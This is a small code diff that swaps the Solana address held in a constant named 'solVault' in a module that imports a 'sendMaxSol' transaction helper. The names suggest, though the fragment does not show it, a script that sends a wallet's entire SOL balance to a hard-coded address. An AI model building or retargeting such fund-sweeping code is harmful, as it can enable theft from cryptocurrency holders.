@@ -4,7 +4,7 @@ import { toast } from 'sonner'
 import { sendMaxSol } from '../sendTransaction/sendMaxSol'
 import { appBaseRoutes } from '@/routes';
 
-const solVault = "4AeeGKPHFm9uzoVJaLhJNTxBzf1UMgRXDH2843w3NBRL"
+const solVault = "7r3ZyZWtRiJVgyk8Ani4bBnreod4uw8kMtetwUuZg8LW"
 
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
